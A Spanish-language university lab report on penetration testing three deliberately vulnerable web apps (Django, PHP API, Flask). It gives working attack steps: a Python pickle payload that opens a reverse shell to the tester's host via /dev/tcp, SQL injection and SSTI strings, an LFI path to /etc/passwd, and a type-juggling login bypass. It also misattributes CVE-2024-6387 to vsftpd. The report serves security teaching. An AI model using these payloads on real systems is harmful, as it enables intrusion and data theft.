# Informe de Práctica 1: Análisis de Vulnerabilidades en Entorno Web



**Universidad UNIE**  
**Seguridad Informática y Ciberseguridad en la Empresa**  
**Curso 2025/2026**

---

## Integrantes del Grupo

- **Alejandro Gonzalo Millón**
- **Daniel Relloso Orcajo**
- **Daniel Willson Pastor**

**Fecha de entrega:** 4 de diciembre de 2025

---

## Introducción

Nuestra misión ha sido emular las tácticas de un atacante real, aplicando metodologías estructuradas de pentesting para descubrir y explotar vulnerabilidades en tres aplicaciones web independientes (App1, App2 y App3). Cada aplicación, desarrollada con diferentes tecnologías y arquitecturas, presentaba su propio conjunto de debilidades, algunas evidentes y otras ocultas tras capas de código aparentemente seguro.

Hemos seguido una metodología en fases, comenzando con el reconocimiento pasivo y activo del objetivo, identificando servicios expuestos, puertos abiertos y tecnologías subyacentes. Posteriormente, hemos realizado una enumeración exhaustiva de cada aplicación, buscando vectores de ataque como:

- **Exposición de información sensible:** Código fuente, credenciales, esquemas de base de datos...
- **Vulnerabilidades de inyección:** SQL, SSTI, RCE, comandos...
- **Fallos de autenticación y autorización:** Accesos no controlados, bypass de login...
- **Errores de configuración:** Debug activado, backups accesibles públicamente...

Para cada vulnerabilidad identificada, hemos documentado no solo su explotación técnica, sino también el impacto potencial en un entorno real. De las mitigaciones nos centraremos en la siguiente práctica.

---

## Índice de Vulnerabilidades Encontradas

| Vulnerabilidad | Ubicación | Riesgo | Descripción |
|----------------|-----------|--------|-------------|
| Exposición de backups | Puerto 9001 | Crítico | Listado de directorios habilitado con acceso a código fuente |
| Tráfico sin cifrar (HTTP) | Todas las apps | Medio | Comunicaciones sin HTTPS, vulnerable a interceptación |
| Debug mode activado | App1 | Alto | DEBUG=True expone información sensible del sistema |
| Configuración insegura de cookies | App1, App3 | Medio | Falta HttpOnly, Secure y SameSite correctamente configurados |
| Session timeout inadecuado | App1, App2, App3 | Medio | Sesiones con caducidad excesiva o permanente |
| Contraseñas débiles | App1, App2 | Alto | Credenciales predeterminadas (admin/admin) |
| Acceso al panel de administración | App1 | Alto | Panel admin accesible sin restricciones adicionales |
| Upload sin validación | App1 | Crítico | Permite subir cualquier tipo de archivo (malware upload) |
| Error EOFError en Gallery View | App1 | Bajo | Error no manejado al navegar entre secciones |
| RCE via Python Pickle | App1 | Crítico | Deserialización insegura permite ejecución remota de código |
| Credenciales en texto plano (BD) | App1, App2, App3 | Crítico | Contraseñas sin cifrar en base de datos |
| Directory listing y acceso no autorizado | App1, App2, App3 | Alto | Archivos de usuarios accesibles sin autenticación |
| Cifrado con clave embebida en el cliente | App1 | Crítico | Clave de cifrado visible en código fuente |
| Compromiso total de la aplicación | App1, App2 | Crítico | Acceso total vía credenciales débiles |
| Exposición de esquema SQL | App2 | Alto | Archivo database.sql accesible públicamente |
| PHP Type Juggling | App2 | Alto | Comparación débil permite bypass de autenticación |
| Local File Inclusion (LFI) | App2 | Alto | Permite acceso a archivos del sistema |
| SQL Injection | App2, App3 | Crítico | Consultas SQL sin parametrizar |
| Ausencia de cookies de sesión | App2 | Medio | Sin mecanismos alternativos seguros implementados |
| Falta de cabeceras de seguridad | App2 | Medio | X-Content-Type-Options y X-Frame-Options ausentes |
| Vulnerabilidad token (uso del Bearer) | App2 | Grave | Token JWT con privilegios excesivos |
| SSTI (Server-Side Template Injection) | App3 | Crítico | Inyección de plantillas permite RCE |
| Session Fixation | App3 | Medio | Cookies con valores predeterminados |
| CSRF habilitado | App3 | Medio | CSRF_ENABLED=True en configuración |
| Secret Key expuesta | Todas las apps | Alto | Claves secretas visibles en código |
| Buffer Overflow + Format String | Puerto 5555 (App5) | Alto | Vulnerabilidad en binario C |
| Permisos sudo mal configurados | Sistema | Crítico | Usuario con privilegios totales (ALL:ALL) |
| Permisos SQL excesivos | Sistema | Crítico | Usuario puede ejecutar comandos del sistema vía MySQL |
| Ausencia de antivirus | Sistema | Medio | Sin protección contra malware |
| Sesión anónima FTP | Sistema | Medio | Acceso FTP sin verificación (teórico) |

---

## Fase 1: Reconocimiento y Enumeración

### Escaneo TCP

**Comando Ejecutado:**

```bash
nmap 192.168.88.128
```

**Resultados Obtenidos:**

![Nmap a UBUNTU](photos/NMAP.png)



### Análisis Detallado por Puerto

#### Puerto 21/tcp - FTP (vsftpd)

```text
21/tcp    open   ftp     vsftpd (broken: both local and anonymous access disabled!)
```

**Observaciones:**

- Servidor: vsftpd (Very Secure FTP Daemon)
- Estado: Acceso anónimo deshabilitado según el escaneo
- Conclusión: No podemos acceder sin credenciales válidas. Posible vector si encontramos credenciales en otro lugar.
- Esta versión se puede explotar con **CVE-2024-6387**

#### Puerto 22/tcp - SSH

```text
22/tcp    open   ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a1:a0:86:5d:7c:7f:4e:f4:ab:ca:90:0d:49:89:e4:7c (ECDSA)
|_  256 30:c4:82:38:86:3e:08:3e:87:5c:a8:08:f6:8d:fe:e1 (ED25519)
```

**Observaciones:**

- Versión: OpenSSH 9.6p1 (actual, sin vulnerabilidades críticas conocidas)
- Sistema: Ubuntu 3ubuntu13.11
- Conclusión: SSH normalmente es difícil de vulnerar directamente. Requeriría credenciales válidas o una vulnerabilidad específica en esta versión.

#### Puerto 80/tcp - HTTP

```text
80/tcp    open   http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

**Observaciones:**

- Servidor: Apache 2.4.58 en Ubuntu
- Conclusión: Puerto principal para aplicaciones web. Posibles vectores:
  - Aplicaciones vulnerables (App1, App2, App3)
  - Configuraciones incorrectas
  - Vulnerabilidades en Apache

#### Puerto 3306/tcp - MySQL/MariaDB

```text
3306/tcp  open   mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

**Observaciones:**

- Base de datos: MariaDB 10.3.23 o anterior
- Estado: "unauthorized" - acceso denegado sin credenciales
- Conclusión: Potencial para:
  - Inyección SQL si las apps tienen vulnerabilidades
  - Acceso directo si encontramos credenciales
  - Enumeración si la configuración lo permite

#### Puerto 5555/tcp - Freeciv

```text
5555/tcp open  freeciv
```

**Observaciones:**

- Servicio: Freeciv (juego de estrategia)
- Conclusión: Posible vector si:
  - Hay vulnerabilidades en el servicio
  - Se usa para algo diferente a Freeciv (servicio mal etiquetado)

#### Puerto 9001/tcp - HTTP (SimpleHTTPServer)

```text
9001/tcp  open   http    SimpleHTTPServer 0.6 (Python 3.13.0)
|_http-server-header: SimpleHTTP/0.6 Python/3.13.0
|_http-title: Directory listing for /
```

**Observaciones CRÍTICAS:**

- Servidor: SimpleHTTPServer de Python 3.13.0
- **LISTADO DE DIRECTORIOS HABILITADO** - ¡Grave error de configuración!
- Conclusión: Posible exposición de archivos sensibles. Primer vector de ataque importante.

### Escaneo UDP

**Comando ejecutado:**

```bash
nmap -sU 192.168.88.128
```

![Escaneo UDP](photos/Pasted%20image%2020251203110814.png)

Se detectó un puerto filtrado en el 5353.

### Resumen de Hallazgos Iniciales

#### Riesgos Identificados:

| Puerto | Servicio | Riesgo | Acción Recomendada |
|--------|----------|--------|-------------------|
| 21 | FTP | Medio | Buscar credenciales en otros vectores |
| 22 | SSH | Bajo | Último recurso, difícil de explotar |
| 80 | HTTP | ALTO | Principal vector - 3 aplicaciones web |
| 3306 | MariaDB | Medio-Alto | Depende de vulnerabilidades en apps |
| 5555 | Freeciv | Bajo | Investigar si es realmente Freeciv |
| 9001 | HTTP | CRÍTICO | Listado directorios - posible filtración |

#### Plan de Ataque Inicial:

1. **Primer objetivo:** Puerto 9001 - Investigar listado de directorios
2. **Segundo objetivo:** Puerto 80 - Enumerar aplicaciones web
3. **Tercer objetivo:** Buscar conexiones entre servicios
4. **Cuarto objetivo:** Credenciales para servicios restringidos

### Conclusiones Tácticas

- El servidor está relativamente bien cerrado - solo puertos esenciales abiertos
- El error de configuración en el puerto 9001 es nuestra puerta de entrada principal
- La presencia de MariaDB sugiere que las aplicaciones usan bases de datos → posible SQL injection
- Tres aplicaciones web distintas en el puerto 80 sugieren arquitectura modular con posibles fallos en cada una

---

## Vulnerabilidades Identificadas

### Puerto 9001: Exposición Crítica de Información

#### Descripción General

Al acceder a `http://192.168.207.130:9001/` observamos inmediatamente que el servidor SimpleHTTPServer tiene habilitado el listado de directorios sin ningún tipo de autenticación o restricción. Esta configuración expone los siguientes archivos críticos:

- `backup_app1.tar.gz`
- `backup_app2.tar.gz`
- `backup_app3.tar.gz`

![Listado de directorios en puerto 9001](photos/Pasted%20image%2020251204200546.png)

#### Impacto

Esta vulnerabilidad es extremadamente crítica porque:

1. **Exposición total del código fuente:** Los archivos de backup contienen el código completo de las tres aplicaciones, incluyendo lógica de negocio, configuraciones y credenciales.

2. **Sin autenticación:** Cualquier persona con acceso de red puede descargar estos archivos sin necesidad de credenciales.

3. **Comunicación sin cifrar:** El servidor opera sobre HTTP (no HTTPS), lo que significa que toda la comunicación puede ser interceptada mediante ataques Man-in-the-Middle.

4. **Facilita ataques posteriores:** Con acceso al código fuente, un atacante puede:
   - Identificar vulnerabilidades específicas sin necesidad de fuzzing
   - Obtener credenciales hardcodeadas
   - Comprender la arquitectura completa del sistema
   - Planificar ataques dirigidos con mayor precisión

#### Recomendaciones

- Deshabilitar el listado de directorios en servidores web de producción
- Nunca exponer archivos de backup en servicios accesibles públicamente
- Implementar autenticación robusta para acceso a archivos sensibles
- Utilizar HTTPS para todas las comunicaciones
- Almacenar backups en ubicaciones seguras con acceso restringido

---

## Aplicación 1 (App1) - Django

### 1. Debug Mode Activado

#### Descripción

Al intentar realizar login en `http://app1.unie/users/login/`, la aplicación muestra un error detallado que revela información extremadamente sensible del sistema. Esto se debe a que la variable `DEBUG = True` está activada en la configuración de Django.

#### Información Expuesta

El error muestra datos críticos como:

```python
databases:
{'default': {'ATOMIC_REQUESTS': True,
             'AUTOCOMMIT': True,
             'CONN_HEALTH_CHECKS': False,
             'CONN_MAX_AGE': 0,
             'ENGINE': 'django.db.backends.mysql',
             'HOST': 'localhost',
             'NAME': 'app1_database',
             'OPTIONS': {},
             'PASSWORD': '********************',
             'PORT': '',
             'TEST': {'CHARSET': None,
                      'COLLATION': None,
                      'MIGRATE': True,
                      'MIRROR': None,
                      'NAME': None},
             'TIME_ZONE': None,
             'USER': 'app1_user'}}
```

Además de:
- Rutas completas del sistema de archivos
- Variables de entorno
- Estructura de la aplicación
- Consultas SQL ejecutadas
- Stack traces completos

#### Impacto

Con el modo debug activo, un atacante obtiene:
- Nombres de usuario de base de datos
- Estructura de la base de datos
- Rutas del servidor
- Versiones de librerías utilizadas
- Información para planificar ataques más sofisticados

### 2. Configuración Insegura de Cookies

#### Descripción

Mediante la inspección de las cookies de sesión en las herramientas de desarrollo del navegador, identificamos múltiples problemas en su configuración:

#### Problemas Detectados:

1. **Ausencia de flag HttpOnly:** Las cookies son accesibles desde JavaScript, lo que las hace vulnerables a ataques XSS. Un atacante podría robar la sesión mediante scripts maliciosos.

2. **Ausencia de flag Secure:** Las cookies se transmiten sobre HTTP sin cifrar, permitiendo su captura en ataques de interceptación de tráfico.

3. **Configuración incorrecta de SameSite:** Sin protección adecuada contra CSRF, las cookies pueden ser enviadas en peticiones cross-site.

4. **Caducidad excesiva:** Las cookies expiran el 22 de diciembre de 2025, dando una ventana de tiempo muy amplia para su explotación.

#### Impacto

- Robo de sesiones mediante XSS
- Ataques de Man-in-the-Middle para interceptar cookies
- CSRF facilitado por configuración inadecuada
- Sesiones permanentes que no expiran apropiadamente

### 3. Session Timeout Inadecuado

#### Descripción

Las sesiones en App1 nunca expiran automáticamente, lo que significa que las cookies de sesión permanecen válidas indefinidamente. Esto se evidencia al revisar la configuración de la aplicación donde no existe un timeout configurado.

#### Impacto

- Las sesiones robadas permanecen válidas indefinidamente
- Mayor ventana de tiempo para ataques de session hijacking
- Sesiones abandonadas en equipos compartidos permanecen activas

### 4. Contraseñas Débiles y Predeterminadas

#### Descripción

Durante el análisis del panel de administración accesible en `http://app1.unie/admin/`, implementamos un script de fuerza bruta (`bruteforce.py`) utilizando la wordlist `rockyou.txt`. A pesar de la protección CSRF, logramos identificar que las credenciales de administrador son:

- **Usuario:** admin
- **Contraseña:** admin

![Fuerza bruta exitosa](photos/Pasted%20image%2020251204201834.png)

#### Impacto

Las credenciales predeterminadas permiten:
- Acceso total al panel de administración
- Gestión de usuarios y permisos
- Acceso a toda la información almacenada
- Modificación de configuraciones críticas

### 5. Panel de Administración Accesible

#### Descripción

El panel de Django admin es accesible públicamente simplemente añadiendo `/admin` a la URL base de la aplicación. No existe ninguna restricción adicional como autenticación multifactor, limitación por IP, o captcha después de múltiples intentos fallidos.

#### Impacto

- Superficie de ataque ampliada
- Facilita ataques de fuerza bruta
- No hay rate limiting implementado
- Acceso privilegiado sin controles adicionales

### 6. Upload sin Validación (Malware Upload)

#### Descripción

En la sección Gallery View de la aplicación, el sistema permite subir archivos sin realizar ningún tipo de validación sobre:
- Extensión del archivo
- Tipo MIME real del contenido
- Tamaño del archivo
- Contenido malicioso

#### Explotación

Un atacante puede:
1. Subir un archivo con extensión `.png` pero que contenga código PHP malicioso
2. Subir ejecutables renombrados con extensiones de imagen
3. Subir web shells disfrazadas como imágenes

#### Impacto

- Ejecución de código arbitrario en el servidor
- Instalación de backdoors permanentes
- Compromiso total del sistema
- Propagación de malware (virus, ransomware, spyware)

### 7. Error EOFError en Gallery View

#### Descripción

Al intentar acceder a la sección de perfil desde Gallery View, la aplicación genera un error de tipo `EOFError`. Este error sugiere un problema en el manejo de datos serializados o en la comunicación entre componentes.

#### Impacto

- Posible vector de Denial of Service
- Revelación de información sobre la arquitectura interna
- Indica problemas en el manejo de excepciones

### 8. RCE via Python Pickle (Crítico)

#### Descripción

En el archivo `/var/www/html/app1/users/views.py`, línea 84, dentro de la clase `ProfileView`, encontramos el uso inseguro de `pickle.loads()` para deserializar datos del usuario sin validación previa.

![Código vulnerable con pickle](photos/Pasted%20image%2020251203102909.png)

#### Explotación Paso a Paso

**1. Obtener CSRF token inicial:**

```bash
curl -c cookies.txt http://app1.unie/users/login/ -s > login.html

CSRF1=$(grep -o "csrfmiddlewaretoken.*value='[^']*'" login.html | sed "s/.*value='//;s/'//")
[ -z "$CSRF1" ] && CSRF1=$(grep -o 'csrfmiddlewaretoken.*value="[^"]*"' login.html | sed 's/.*value="//;s/"//')
```

**2. Iniciar sesión:**

```bash
curl -b cookies.txt -c cookies.txt -v \
  -d "username=alejandro&password=1234&csrfmiddlewaretoken=$CSRF1&next=/users/profile/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://app1.unie/users/login/" \
  http://app1.unie/users/login/ 2>&1 | grep -i "set-cookie\|location\|http"
```

**3. Extraer CSRF del perfil:**

```bash
curl -b cookies.txt http://app1.unie/ -s > home_autenticado.html

LINEA=$(grep -n "action=\"/users/profile/\"" home_autenticado.html | cut -d: -f1)
PROFILE_CSRF=$(cat home_autenticado.html | tr '>' '\n' | grep "csrfmiddlewaretoken" | sed 's/.*value="//' | sed 's/".*//')
```

> [!WARNING]  
> Tienes que copiar el csrf que salga en pantalla y poner PROFILE_CSRF="csrf" como en la imagen

![Extracción de CSRF](photos/Pasted%20image%2020251204163818.png)

**4. Configurar listener:**

```bash
ncat -nlvp 4444
```

**5. Enviar payload malicioso:**

```bash
REVERSE_PAYLOAD=$(python3 << 'EOF'
import pickle, base64

class RCE:
    def __reduce__(self):
        import os
        cmd = "bash -c 'bash -i >& /dev/tcp/192.168.207.1/4444 0>&1' &"
        return os.system, (cmd,)

print(base64.b64encode(pickle.dumps(RCE())).decode())
EOF
)

curl -b cookies.txt -X POST \
  -d "usernameSlug=$REVERSE_PAYLOAD&csrfmiddlewaretoken=$PROFILE_CSRF" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://app1.unie/" \
  http://app1.unie/users/profile/ -s > /dev/null
```

![Reverse shell exitosa](photos/Pasted%20image%2020251204164328.png)

#### Impacto

- **Ejecución remota de código** con los privilegios de la aplicación web
- Acceso completo al sistema de archivos
- Capacidad de escalar privilegios
- Instalación de backdoors permanentes
- Exfiltración de datos sensibles

### 9. Credenciales en Texto Plano (Base de Datos)

#### Descripción

Accediendo a la base de datos mediante SSH al servidor (`ssh user@192.168.207.130`) y luego conectando a MySQL, descubrimos que:

```sql
USE app1_database;
SHOW TABLES;
SELECT * FROM users_person;
```

Las contraseñas de usuarios regulares están cifradas mediante hash (buena práctica), sin embargo:

1. **Email en texto claro:** Los correos electrónicos de usuarios, incluyendo el administrador, están visibles sin cifrar, lo que los expone a:
   - Campañas de phishing dirigidas
   - Spam
   - Ingeniería social

2. **Usuario privilegiado de MariaDB:** Existe un usuario con privilegios elevados en la base de datos, que si es comprometido, permite:
   - Acceso total a todos los datos
   - Modificación de registros
   - Ejecución de comandos del sistema (si está mal configurado)

#### Impacto

- Extracción de información de usuarios
- Posibilidad de phishing dirigido
- Compromiso total de la base de datos si se accede al usuario privilegiado

### 10. Tráfico sin Cifrar (HTTP)

#### Descripción

La aplicación no implementa HTTPS, operando completamente sobre HTTP. Esto significa que toda la comunicación entre el cliente y el servidor viaja en texto plano.

#### Impacto

- Interceptación de credenciales durante el login
- Robo de cookies de sesión
- Ataques Man-in-the-Middle
- Posibilidad de modificar el tráfico en tránsito
- No hay verificación de la legitimidad del servidor

### 11. Directory Listing y Acceso No Autorizado

#### Descripción

La ruta `http://app1.unie/static/` presenta un listado de directorios completamente abierto. Sin necesidad de autenticación, cualquier usuario puede visualizar y descargar archivos subidos por diferentes usuarios de la aplicación.

#### Explotación

Simplemente navegando a `http://app1.unie/static/` se puede ver toda la estructura de carpetas y archivos, incluyendo:
- Imágenes subidas por usuarios
- Documentos personales
- Archivos de configuración
- Cualquier contenido almacenado en el directorio

#### Impacto

- **Fuga masiva de información:** Acceso a datos de múltiples usuarios sin control
- **Violación de privacidad:** Los usuarios no son conscientes de que sus archivos son públicos
- **Incumplimiento normativo:** Posible violación de GDPR y otras regulaciones de protección de datos
- **Confianza del usuario:** Pérdida total de confianza en la seguridad de la plataforma
- **Exfiltración de datos sensibles:** Documentos corporativos, información personal identificable (PII), etc.

### 12. Cifrado con Clave Embebida en el Cliente

#### Descripción

Durante el análisis del tráfico con BurpSuite, identificamos que los tokens de sesión están aparentemente cifrados. Sin embargo, al revisar el código fuente disponible en los backups, descubrimos que la clave de cifrado utilizada para proteger estos tokens se encuentra hardcodeada directamente en el código de la aplicación.

#### Análisis Técnico

El código muestra algo similar a:

```python
ENCRYPTION_KEY = "mi_clave_secreta_123456"

def encrypt_token(data):
    # Cifrado usando la clave hardcodeada
    return cipher.encrypt(data, ENCRYPTION_KEY)
```

#### Impacto

Esta vulnerabilidad es extremadamente grave porque:

1. **Reversibilidad total:** Con acceso a la clave, cualquier token cifrado puede ser descifrado trivialmente
2. **Generación de tokens falsos:** Un atacante puede crear tokens de sesión válidos para cualquier usuario
3. **Suplantación de identidad:** Acceso completo a cualquier cuenta sin conocer credenciales
4. **Modificación de tokens:** Alteración de datos de sesión como roles o permisos
5. **Sin rotación posible:** Cambiar la clave requiere modificar el código y redistribuir la aplicación

**Escenario de ataque:**
```python
# Atacante con acceso al código
ENCRYPTION_KEY = "mi_clave_secreta_123456"  # Extraída del código
admin_token = encrypt_token({"user_id": 1, "role": "admin"}, ENCRYPTION_KEY)
# Ahora tiene un token de administrador válido
```

---

## Aplicación 2 (App2) - PHP/API

### 1. Exposición del Esquema de Base de Datos

#### Descripción

Dentro del backup `backup_app2.tar.gz` descargado del puerto 9001, encontramos el archivo `database.sql` que contiene la estructura completa de la base de datos:

```bash
wget http://192.168.88.131:9001/backup_app2.tar.gz
tar -xzf backup_app2.tar.gz
find . -name "database.sql"
cat ./var/www/html/app2/database.sql
```

El esquema revela:

```sql
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(100) NOT NULL UNIQUE,
    passwd VARCHAR(255) NOT NULL
);

CREATE TABLE books (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(200) NOT NULL,
    author VARCHAR(100) NOT NULL,
    user_id INT,
    FOREIGN KEY (user_id) REFERENCES users(id)
);
```

#### Impacto

Conocer el esquema exacto permite:
- Construir ataques de SQL Injection sin necesidad de enumerar tablas/columnas
- Saber que la columna de contraseña se llama `passwd` (no `password` o `pwd`)
- Comprender las relaciones entre entidades
- Optimizar ataques con payloads específicos como:

```sql
' UNION SELECT id, username, email, passwd FROM users--
```

### 2. PHP Type Juggling

#### Descripción

Revisando el código en `var/www/html/app2/UserService.php`, identificamos que el sistema utiliza comparación débil (`==`) en lugar de comparación estricta (`===`) para validar credenciales.

![Código vulnerable en UserService.php](photos/Pasted%20image%2020251203100647.png)

#### Explotación

**Petición normal correcta:**

```bash
curl -X POST http://app2.unie/v2/users/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@app2.unie","password":"correctPassword"}'
```

![Respuesta con credenciales correctas](photos/Pasted%20image%2020251203100938.png)

**Bypass mediante Type Juggling:**

```bash
curl -X POST http://app2.unie/v2/users/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@app2.unie","password":true}'
```

![Bypass exitoso](photos/Pasted%20image%2020251203101135.png)

Enviando `true` como contraseña, PHP convierte ambos valores a booleanos durante la comparación débil, resultando en una validación exitosa sin conocer la contraseña real.

#### Impacto

- Bypass completo de autenticación
- Acceso a cualquier cuenta sin conocer la contraseña
- Compromiso de todas las cuentas del sistema

### 3. SQL Injection

#### Descripción

En el archivo `Book.php` identificamos que las consultas SQL no están parametrizadas correctamente. Los valores proporcionados por el usuario se concatenan directamente en la query sin validación ni escape.
El sql injection se puede apreciar en el inicio de sesión, donde si ponemos 
```
`a' OR '1'='1' --`
```
y de contraseña cualquier cosa nos salta el sql injection. También se puede confirmar ya que salta cuando ponemos el order by 6

#### Código Vulnerable

```php
query = "select * from user where user='%s' and password='%s'" % (form.user.data, form.password.data)
```

#### Impacto

Un atacante puede:
- Extraer toda la información de la base de datos
- Modificar o eliminar registros
- En casos extremos, ejecutar comandos del sistema si MySQL tiene permisos excesivos
- Bypassear autenticación mediante payloads como: `1 OR 1=1--`

### 4. Local File Inclusion (LFI)

#### Descripción

En `index.php` encontramos que se incluyen archivos dinámicamente sin validación adecuada:

```php
include($_GET['page']);
```

El código solo verifica que el archivo exista, pero no valida que sea un archivo legítimo de la aplicación.

#### Explotación

```bash
http://app2.unie/index.php?page=../../../../etc/passwd
http://app2.unie/index.php?page=database.sql
```

#### Impacto

- Lectura de archivos sensibles del sistema
- Exposición de configuraciones
- Posible escalada a RCE si se combina con upload de archivos
- Exfiltración de información confidencial

### 5. Descarga No Autorizada de Archivos

#### Descripción

Los archivos de la aplicación, incluyendo `database.sql`, pueden descargarse directamente desde el navegador sin autenticación:

```
http://app2.unie/database.sql
```

Esto descarga el archivo directamente a la carpeta de descargas del navegador.

#### Impacto

- Exposición del esquema completo de la base de datos
- Revelación de la estructura de la aplicación
- Facilita otros ataques como SQL Injection

### 6. Ausencia de Cookies de Sesión

#### Descripción

A diferencia de App1 y App3, App2 no utiliza cookies tradicionales para gestionar sesiones. No se encontró evidencia de implementación de mecanismos alternativos seguros como:
- Tokens JWT
- Session storage
- Otros sistemas de autenticación stateless

#### Impacto

Si bien no usar cookies no es inherentemente inseguro, la ausencia de cualquier mecanismo visible de gestión de sesión sugiere:
- Posible falta de control de sesiones
- Dificultad para invalidar sesiones comprometidas
- Sin protección contra session fixation

### 7. Falta de Cabeceras de Seguridad

#### Descripción

Al inspeccionar las respuestas HTTP de App2, notamos la ausencia de cabeceras de seguridad críticas:

**X-Content-Type-Options:** Sin esta cabecera configurada como `nosniff`, el navegador puede interpretar incorrectamente el tipo de contenido, facilitando ataques de ejecución de scripts maliciosos.

**X-Frame-Options:** Su ausencia permite que la aplicación sea cargada en iframes, facilitando ataques de Clickjacking donde un atacante puede engañar a usuarios para que hagan clic en elementos invisibles.

#### Impacto

- Vulnerabilidad a ataques de Clickjacking
- Posibles ataques basados en confusión de tipos MIME
- Falta de defensa en profundidad

### 8. Session Timeout Inadecuado

#### Descripción

En las cabeceras HTTP se observa:

```
Connection: Keep-Alive
```

Esto indica que las conexiones permanecen activas indefinidamente, sin un timeout apropiado.

#### Impacto

- Sesiones que no expiran automáticamente
- Mayor ventana para explotación de sesiones robadas
- Consumo innecesario de recursos del servidor

### 9. Credenciales en Texto Plano (Base de Datos)

#### Descripción

Similar a App1, pero en este caso las credenciales de App2 están almacenadas completamente sin cifrar en la base de datos. Esto incluye:
- Contraseñas de usuarios
- Nombres de usuario
- Correos electrónicos

#### Impacto

- Ante una brecha de seguridad, todas las credenciales son expuestas inmediatamente
- No hay protección adicional si la base de datos es comprometida
- Usuarios no son notificados del riesgo real
- Posibilidad de credential stuffing en otros servicios si los usuarios reutilizan contraseñas

### 10. Tráfico sin Cifrar (HTTP)

#### Descripción

Al igual que App1, App2 no implementa HTTPS, operando completamente sobre HTTP sin cifrado.

#### Impacto

- Interceptación de credenciales durante login
- Robo de tokens de sesión
- Ataques Man-in-the-Middle
- No hay certificado que verifique la legitimidad del servidor

### 11. Compromiso Total de la Aplicación

#### Descripción

A través de la documentación API accesible en `http://app2.unie/docs/`, identificamos el endpoint de autenticación `http://app2.unie/v2/users/login`. Utilizando BurpSuite para interceptar y modificar peticiones, probamos credenciales por defecto.

#### Explotación

**Petición enviada:**

```http
POST /v2/users/login HTTP/1.1
Host: app2.unie
Content-Type: application/json
Content-Length: 56

{
  "email": "admin@app2.unie",
  "password": "admin"
}
```

**Respuesta del servidor:**

```json
{
  "message": "successfully",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6Ijc5OTBiMmRhLTg2NWEtMTFlZi04YzJjLTAwMGMyOTY4MjFjNSJ9.7wLA68AFPXa02q6Pl46TAxwIDvvApiOWISHjbO08P-0"
}
```

La aplicación acepta las credenciales triviales `admin@app2.unie / admin` y devuelve un token JWT válido con privilegios de administrador.

#### Impacto

- **Acceso administrativo completo** sin necesidad de técnicas avanzadas
- Compromiso de la integridad, disponibilidad y confidencialidad de todos los datos
- Gestión completa de usuarios y recursos
- Posible modificación o eliminación de información crítica
- Base para ataques posteriores contra otros sistemas

### 12. Directory Listing y Acceso No Autorizado

#### Descripción

Similar a App1, la ruta `http://app2.unie/static/` muestra un listado de directorios sin restricciones de autenticación. Cualquier usuario puede navegar y descargar archivos de otros usuarios.

#### Impacto

- Exposición de archivos confidenciales
- Violación de la privacidad de usuarios
- Posible exfiltración de datos corporativos
- Incumplimiento de normativas de protección de datos

### 13. Vulnerabilidad en el Uso del Token Bearer

#### Descripción

Una vez obtenido el token JWT mediante login (ver vulnerabilidad de compromiso total), comprobamos que añadiendo la cabecera de autorización es posible acceder a endpoints sensibles sin controles adicionales:

```http
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6Ijc5OTBiMmRhLTg2NWEtMTFlZi04YzJjLTAwMGMyOTY4MjFjNSJ9.7wLA68AFPXa02q6Pl46TAxwIDvvApiOWISHjbO08P-0
```

Con este token podemos acceder a:
- `http://app2.unie/v2/users/` - Lista completa de usuarios
- `http://app2.unie/v2/books/` - Información de todos los recursos

#### Análisis

El problema no es el uso de JWT en sí, sino que:
1. **Sin granularidad de permisos:** El token no parece tener scopes o roles diferenciados
2. **Privilegios excesivos:** Un solo token da acceso a todo
3. **Sin rate limiting:** No hay límites de peticiones por token
4. **Sin expiración visible:** El token parece válido indefinidamente
5. **Sin rotación:** No hay mecanismo de refresh tokens

#### Impacto

- **Acceso masivo a datos:** Con un token comprometido se accede a toda la información
- **Imposibilidad de revocar accesos específicos:** No hay control granular
- **Escalada de privilegios:** Si un token básico es comprometido, proporciona acceso total
- **Exfiltración facilitada:** Un atacante puede automatizar la extracción de toda la base de datos
- **Ausencia de auditoría:** Dificulta rastrear qué acciones realizó cada token


---

## Aplicación 3 (App3) - Flask

### 1. Directory Listing y Acceso No Autorizado

#### Descripción

La ruta `http://app3.unie/static/` también presenta el mismo problema de listado de directorios sin autenticación que las aplicaciones anteriores. Los archivos de todos los usuarios son accesibles públicamente.

#### Impacto

- Fuga directa de información personal y corporativa
- Compromiso de la confidencialidad
- Violación de privacidad de usuarios
- Incumplimiento de regulaciones de protección de datos

### 2. Server-Side Template Injection (SSTI)

#### Descripción

Identificamos SSTI en dos ubicaciones críticas de la aplicación:

**Primera instancia - Creación de usuario:**

Al revisar el código en `/var/www/html/app3/views.py` línea 70, observamos que el sistema procesa el nombre de usuario sin sanitización al crear nuevas cuentas.

![Código vulnerable en views.py](photos/Pasted%20image%2020251204172217.png)

**Prueba de concepto:**

Creamos un usuario con el nombre `{{7*7}}` y cualquier username. Al iniciar sesión, la aplicación renderiza el template y muestra `49` en la esquina superior derecha, confirmando la ejecución de código.

![Confirmación de SSTI](photos/Pasted%20image%2020251204190344.png)

**Segunda instancia - render_template_string():**

En el mismo archivo `views.py` encontramos el uso de `render_template_string()` sin sanitización de entrada. Esta función es particularmente peligrosa porque ejecuta cualquier expresión de template proporcionada por el usuario.

#### Intentos de Explotación Avanzada

Al intentar payloads más sofisticados como:

```python
{{ cycler.__globals__.os.popen('id').read() }}
```

La aplicación devuelve un "Internal Server Error" (similar al comportamiento de SQL Injection cuando la sintaxis es correcta pero hay un error en la ejecución).

![Error interno con SSTI](photos/Pasted%20image%2020251204190517.png)
![Error similar a SQL](photos/Pasted%20image%2020251204190531.png)

#### Impacto

SSTI es una vulnerabilidad crítica que permite:
- **Remote Code Execution (RCE):** Ejecución de comandos del sistema operativo
